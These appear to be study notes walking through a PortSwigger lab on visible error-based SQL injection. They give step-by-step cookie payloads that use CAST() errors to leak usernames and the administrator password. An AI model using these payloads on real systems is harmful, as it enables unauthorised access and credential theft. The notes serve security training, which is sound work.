
Source: https://portswigger.net/web-security/sql-injection/blind

Extracting sensitive data via verbose SQL error messages:
|   Misconfiguration of the database sometimes results in verbose error messages.
|   For example, consider the following error message, which occurs after injecting a single quote into an id parameter: 
|   |       
|   |-----> Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
|   
|
|   One way of achieving this is to use the CAST() function, which enables you to convert one data type to another. 
|   For example, consider a query containing the following statement: 
|   |    
|   |-----> CAST((SELECT example_column FROM example_table) AS int)
|   
|
|   Often, the data that you're trying to read is a string. 
|   Attempting to convert this to an incompatible data type, 
|   such as an int, may cause an error similar to the following: 
|   |
|   |-----> ERROR: invalid input syntax for type integer: "Example data"
|   |
|   |---->So: This type of query may also be useful in cases where you're unable to trigger conditional responses 
|             because of a character limit imposed on the query. 
|             این نوع پرس و جو همچنین ممکن است در مواردی مفید باشد
|             که به دلیل محدودیت کاراکتر بر پرس و جو نمی توانید پاسخ های شرطی را راه اندازی کنید.  


Source: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

Lab: Visible error-based SQL injection:
|   This lab contains a SQL injection vulnerability.
|   The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
|   The results of the SQL query are not returned.
|   The database contains a different table called "users", with columns called "username" and "password".
|    To solve the lab, find a way to leak the password for the administrator user, then log in to their account. 


Target:
|   Step1: Get administrator Name
|   Step2: Get password of administrator



Detection:
Step1: BurpSuite
Step2: Proxy > HTTP history tab and find a GET / request that contains a TrackingId cookie.

Step3: In Repeater, append a single quote to the value of your TrackingId cookie and send the request.
|
|====> TrackingId=ogAZZfxtOKUELbuJ'
| 
|Result -> notice the verbose error message. 
|So -----> This discloses the full SQL query, including the value of your cookie.
|          explains that you have an unclosed string literal.
|          Observe that your injection appears inside a single-quoted string. 
|________________________________________


Step4: In the request, add comment characters to comment out the rest of the query, 
|      including the extra single-quote character that's causing the error: 
|
|====> TrackingId=ogAZZfxtOKUELbuJ'--
|
|   Result -> Confirm that you no longer receive an error.
|   So -----> This suggests that the query is now syntactically valid. 
|
|_________________________________________


Step5: Adapt the query to include a generic "SELECT" subquery and cast the returned value to an int data type: 
|
|====> TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
|
|   Result -> Observe that you now get a different error saying that an AND condition must be a boolean expression. 
|   So -----> This is maybe error message
|_________________________________________


Step6: Modify the condition accordingly. For example, you can simply add a comparison operator (=) as follows: 
|
|====> TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
|
|   Result -> Confirm that you no longer receive an error. 
|   So -----> This suggests that this is a valid query again. 
|_________________________________________


Step7: Adapt your generic SELECT statement so that it retrieves usernames from the database: 
|
|====> TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
|
|   Result -> you receive the initial error message again.
|             your query now appears to be truncated due to a character limit.
|   So -----> the comment characters you added to fix up the query aren't included. 
|_________________________________________


Step8: Delete the original value of the TrackingId cookie to free up some additional characters. Resend the request. 
|
|====> TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
|
|   Result -> you receive a new error message. 
|             which appears to be generated by the database.
|   So -----> This suggests that the query was run properly, 
|             but you're still getting an error because it unexpectedly returned more than one row. 
|_________________________________________


Step9: Modify the query to return only one row: 
|
|====> TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
|
|   Result -> Observe that the error message now leaks the first username from the users table
|
|   Important Result = ERROR: invalid input syntax for type integer: "administrator"
|
|
|   So -----> Now that you know that the administrator is the first user in the table, modify the query once again to leak their password: 
|   |
|   |====> TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
|   |
|   |
|   |Result:  Log in as administrator using the stolen password to solve the lab. 
|   |_________________________________________
|
|_________________________________________


























































































































